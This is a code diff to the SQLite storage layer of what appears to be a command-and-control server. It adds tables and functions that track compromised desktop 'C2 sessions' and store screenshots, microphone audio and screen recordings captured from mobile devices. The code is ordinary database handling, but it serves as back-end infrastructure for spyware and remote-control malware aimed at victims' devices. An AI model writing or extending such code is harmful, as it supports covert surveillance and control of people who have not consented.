@@ -71,6 +71,19 @@ def init_database():
         )
     ''')
 
+    # Mobile Media Captures (screenshots, microphone audio, screen recordings)
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS mobile_captures (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            uid TEXT,
+            capture_type TEXT,
+            filename TEXT,
+            url TEXT,
+            meta TEXT DEFAULT '{}',
+            timestamp TEXT
+        )
+    ''')
+
     # Campaigns Table
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS campaigns (
@@ -353,6 +366,10 @@ def init_database():
 
 def save_mobile_session(uid, info, ip):
     """Save or update a mobile session"""
+    if not uid:
+        # A session without a uid is unusable and corrupts the client list
+        return
+
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     
@@ -410,6 +427,9 @@ def get_all_mobile_sessions():
     
     sessions = {}
     for row in rows:
+        if not row[0]:
+            # Skip legacy/corrupt rows with no uid
+            continue
         sessions[row[0]] = {
             'uid': row[0],
             'info': json.loads(row[1]) if row[1] else {},
@@ -444,6 +464,125 @@ def delete_mobile_session(uid):
     
     conn.commit()
     conn.close()
+
+
+# ===== C2 SESSIONS =====
+
+def save_c2_session(uid, info, ip):
+    """Save or update a desktop C2 session"""
+    if not uid:
+        return
+
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+
+    now = datetime.now().isoformat()
+
+    cursor.execute('SELECT uid, first_seen FROM c2_sessions WHERE uid = ?', (uid,))
+    existing = cursor.fetchone()
+
+    if existing:
+        cursor.execute('''
+            UPDATE c2_sessions
+            SET info = ?, ip = ?, last_seen = ?, registered_at = ?
+            WHERE uid = ?
+        ''', (json.dumps(info), ip, now, now, uid))
+    else:
+        cursor.execute('''
+            INSERT INTO c2_sessions (uid, info, ip, last_seen, registered_at, first_seen)
+            VALUES (?, ?, ?, ?, ?, ?)
+        ''', (uid, json.dumps(info), ip, now, now, now))
+
+    conn.commit()
+    conn.close()
+
+
+def update_c2_last_seen(uid):
+    """Update the last seen timestamp for a desktop C2 session"""
+    if not uid:
+        return
+
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+
+    now = datetime.now().isoformat()
+    cursor.execute('UPDATE c2_sessions SET last_seen = ? WHERE uid = ?', (now, uid))
+
+    conn.commit()
+    conn.close()
+
+
+def get_all_c2_sessions():
+    """Get all persisted desktop C2 sessions"""
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+
+    cursor.execute('SELECT * FROM c2_sessions ORDER BY last_seen DESC')
+    rows = cursor.fetchall()
+    conn.close()
+
+    sessions = {}
+    for row in rows:
+        if not row[0]:
+            continue
+        sessions[row[0]] = {
+            'uid': row[0],
+            'info': json.loads(row[1]) if row[1] else {},
+            'ip': row[2],
+            'last_seen': row[3],
+            'registered_at': row[4],
+            'first_seen': row[5]
+        }
+
+    return sessions
+
+
+# ===== MOBILE MEDIA CAPTURES =====
+
+def save_mobile_capture(uid, capture_type, filename, url, meta=None):
+    """Persist a mobile media capture (screenshot / audio / screen recording)"""
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+
+    now = datetime.now().isoformat()
+    cursor.execute('''
+        INSERT INTO mobile_captures (uid, capture_type, filename, url, meta, timestamp)
+        VALUES (?, ?, ?, ?, ?, ?)
+    ''', (uid, capture_type, filename, url, json.dumps(meta or {}), now))
+
+    conn.commit()
+    conn.close()
+    return now
+
+
+def get_mobile_captures(uid=None, limit=200):
+    """Get mobile media captures, newest first. Optionally filtered by uid."""
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+
+    if uid:
+        cursor.execute(
+            'SELECT * FROM mobile_captures WHERE uid = ? ORDER BY id DESC LIMIT ?',
+            (uid, limit)
+        )
+    else:
+        cursor.execute('SELECT * FROM mobile_captures ORDER BY id DESC LIMIT ?', (limit,))
+
+    rows = cursor.fetchall()
+    conn.close()
+
+    captures = []
+    for row in rows:
+        captures.append({
+            'id': row[0],
+            'uid': row[1],
+            'type': row[2],
+            'filename': row[3],
+            'url': row[4],
+            'meta': json.loads(row[5]) if row[5] else {},
+            'timestamp': row[6]
+        })
+    return captures
 
 # ===== MOBILE COMMANDS =====
 
